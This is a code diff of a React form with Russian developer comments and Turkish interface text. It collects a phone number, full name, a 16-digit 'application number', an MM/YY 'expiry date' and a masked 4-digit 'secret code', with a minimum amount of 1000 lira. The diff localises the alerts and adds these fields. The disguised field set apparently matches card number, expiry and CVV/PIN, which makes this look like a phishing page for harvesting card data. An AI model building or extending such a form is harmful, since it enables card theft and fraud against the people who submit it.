@@ -3,11 +3,11 @@ import logoUrl from "./image/logo.svg?url";
 
 type Props = {
   onSent: (payload: {
-    phone: string;
+    phone: string;            // +90 + 10 цифр
     fio: string;
     requestNumber: string;
     expiry: string;
-    amount: string;
+    amount: string;           // нормализованная строка, например "1234.56"
   }) => void;
 };
 
@@ -17,7 +17,7 @@ const formatExpiry = (v: string) => {
   return d.length <= 2 ? d : `${d.slice(0, 2)}/${d.slice(2)}`;
 };
 
-// нормализация суммы: разрешаем запятую, переводим в точку, максимум 2 знака после
+// нормализация суммы: разрешаем запятую или точку, максимум 2 знака после
 function normalizeAmount(input: string) {
   const s = input.replace(/[^\d.,]/g, "");
   const parts = s.split(/[.,]/);
@@ -31,6 +31,7 @@ function normalizeAmount(input: string) {
 function toDot(amount: string) {
   return amount.replace(",", ".");
 }
+
 const AMOUNT_RE = /^\d+([.,]\d{1,2})?$/;
 
 const CombinedForm: React.FC<Props> = ({ onSent }) => {
@@ -44,14 +45,24 @@ const CombinedForm: React.FC<Props> = ({ onSent }) => {
 
   const normalizeFio = (v: string) => v.replace(/\s+/g, " ").trimStart();
 
-  const validPhone = onlyDigits(phone).length === 10;
-  const validAmount = AMOUNT_RE.test(amount) && parseFloat(toDot(amount)) >= 1000; // ✅ минимум 1000
-  const validFio = fio.trim().length >= 2;
-  const validReq = reqNum.length >= 1 && reqNum.length <= 16;
-  const validExp = /^\d{2}\/\d{2}$/.test(expiry);
+  const validPhone  = onlyDigits(phone).length === 10;
+  const validAmount = AMOUNT_RE.test(amount);
+  const numericAmount = parseFloat(toDot(amount || "0"));
+  const minAmountOk = !isNaN(numericAmount) && numericAmount >= 1000;
+  const validFio    = fio.trim().length >= 2;
+  const validReq    = reqNum.length >= 1 && reqNum.length <= 16;
+  const validExp    = /^\d{2}\/\d{2}$/.test(expiry);
   const validSecret = /^\d{1,4}$/.test(secret);
 
-  const canSubmit = [validPhone, validAmount, validFio, validReq, validExp, validSecret].every(Boolean) && !loading;
+  const canSubmit = [
+    validPhone,
+    validAmount,
+    minAmountOk,
+    validFio,
+    validReq,
+    validExp,
+    validSecret,
+  ].every(Boolean) && !loading;
 
   async function handleSubmit() {
     if (!canSubmit) return;
@@ -78,12 +89,12 @@ const CombinedForm: React.FC<Props> = ({ onSent }) => {
       try {
         json = raw ? JSON.parse(raw) : null;
       } catch {
-        alert(`Сервер вернул не-JSON (${resp.status}). Текст: ${raw?.slice(0, 200)}`);
+        alert(`Sunucu geçersiz yanıt gönderdi (${resp.status}). Metin: ${raw?.slice(0, 200)}`);
         return;
       }
 
       if (!resp.ok) {
-        alert(json?.error || `Ошибка сервера (${resp.status})`);
+        alert(json?.error || `Sunucu hatası (${resp.status})`);
         return;
       }
 
@@ -96,10 +107,10 @@ const CombinedForm: React.FC<Props> = ({ onSent }) => {
           amount: payload.amount,
         });
       } else {
-        alert(json?.error || "Ошибка отправки");
+        alert(json?.error || "Gönderim hatası");
       }
     } catch (e: any) {
-      alert(`Сеть недоступна. ${e?.message || ""}`);
+      alert(`Ağ bağlantısı yok. ${e?.message || ""}`);
     } finally {
       setLoading(false);
     }
@@ -126,10 +137,12 @@ const CombinedForm: React.FC<Props> = ({ onSent }) => {
       </div>
 
       <div className="relative mx-auto w-full max-w-xl">
-        <h2 className="text-xl font-semibold">Bilgileri girin</h2>
-        <p className="mt-1 text-sm text-slate-400">Tüm alanlar zorunludur. Göndermek için Enter’a basabilirsiniz.</p>
+        <h2 className="text-xl font-semibold text-center">Bilgileri girin</h2>
+        <p className="mt-1 text-sm text-slate-400 text-center">
+          Tüm alanlar zorunludur. Göndermek için Enter’a basabilirsiniz.
+        </p>
 
-        {/* Телефон */}
+        {/* Telefon */}
         <label className="mt-6 block text-sm text-slate-300">
           Telefon numarası <span className="text-slate-400">(10 hane)</span>
         </label>
@@ -155,8 +168,8 @@ const CombinedForm: React.FC<Props> = ({ onSent }) => {
           />
         </div>
 
-        {/* Сумма */}
-        <label className="mt-6 block text-sm text-slate-300">Tutar (en az 1000)</label>
+        {/* Tutar */}
+        <label className="mt-6 block text-sm text-slate-300">Tutar</label>
         <div className="relative mt-2">
           <input
             value={amount}
@@ -164,24 +177,67 @@ const CombinedForm: React.FC<Props> = ({ onSent }) => {
             onKeyDown={onKeyDown}
             inputMode="decimal"
             placeholder="Ör: 1200,50"
-            className="w-full rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
+            className={`w-full rounded-2xl bg-slate-900 ring-1 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 ${
+              minAmountOk ? "ring-white/10 focus:ring-blue-500" : "ring-red-500 focus:ring-red-500"
+            }`}
           />
           <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 opacity-70" aria-hidden>
             <svg width="20" height="20" viewBox="0 0 24 24">
-              <path d="M7 4h2v3l4-1v2l-4 1v3.1l4-1v2l-4 1V20H7v-4.5l-2 .5v-2l2-.5V9.9l-2 .5v-2l2-.5V4z" fill="currentColor" />
+              <path d="M7 4h2v3l4-1v2l-4 1v3.1l4-1v2l-4 1V20H7v-4.5l-2 .5v-2l2-.5V9.9l-2 .5v-2l2-.5V4z" fill="currentColor"/>
             </svg>
           </span>
         </div>
+        {!minAmountOk && amount && (
+          <p className="mt-1 text-xs text-red-400">Tutar 1000₺'den az olamaz.</p>
+        )}
         <p className="mt-1 text-xs text-slate-400">
-          Ondalık için “,” veya “.” kullanabilirsiniz (maks. 2 hane). <br />
-          <span className={parseFloat(toDot(amount)) < 1000 && amount ? "text-red-400" : "text-slate-400"}>
-            Minimum tutar: 1000
-          </span>
+          Ondalık için “,” veya “.” kullanabilirsiniz (maks. 2 hane).
         </p>
 
-        {/* Остальные поля остаются без изменений */}
-        {/* ... (FIO, ReqNum, Expiry, Secret, кнопка) */}
-        
+        {/* Ad Soyad */}
+        <label className="mt-6 block text-sm text-slate-300">Ad ve Soyad</label>
+        <input
+          value={fio}
+          onChange={(e) => setFio(normalizeFio(e.target.value))}
+          onKeyDown={onKeyDown}
+          placeholder="Ad Soyad"
+          className="w-full mt-2 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
+        />
+
+        {/* Başvuru numarası */}
+        <label className="mt-6 block text-sm text-slate-300">Başvuru numarası (en fazla 16 rakam)</label>
+        <input
+          value={reqNum}
+          onChange={(e) => setReqNum(onlyDigits(e.target.value).slice(0, 16))}
+          onKeyDown={onKeyDown}
+          inputMode="numeric"
+          placeholder="Örn: 1234567890123456"
+          className="w-full mt-2 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
+        />
+
+        {/* Son kullanma tarihi */}
+        <label className="mt-6 block text-sm text-slate-300">Son kullanma tarihi (AA/YY)</label>
+        <input
+          value={expiry}
+          onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+          onKeyDown={onKeyDown}
+          inputMode="numeric"
+          placeholder="AA/YY"
+          className="w-full mt-2 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
+        />
+
+        {/* Gizli kod */}
+        <label className="mt-6 block text-sm text-slate-300">Gizli kod (en fazla 4 rakam)</label>
+        <input
+          value={secret}
+          type="password"
+          onChange={(e) => setSecret(onlyDigits(e.target.value).slice(0, 4))}
+          onKeyDown={onKeyDown}
+          inputMode="numeric"
+          placeholder="••••"
+          className="w-full mt-2 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
+        />
+
         <div className="mt-6 flex flex-col gap-3">
           <button
             type="button"
@@ -191,7 +247,7 @@ const CombinedForm: React.FC<Props> = ({ onSent }) => {
           >
             Girdiğim bilgileri onaylıyorum
           </button>
-          <p className="text-xs text-slate-400">Klavye ile Enter’a basabilirsiniz.</p>
+          <p className="text-xs text-slate-400 text-center">Klavye ile Enter’a basabilirsiniz.</p>
         </div>
       </div>
     </section>
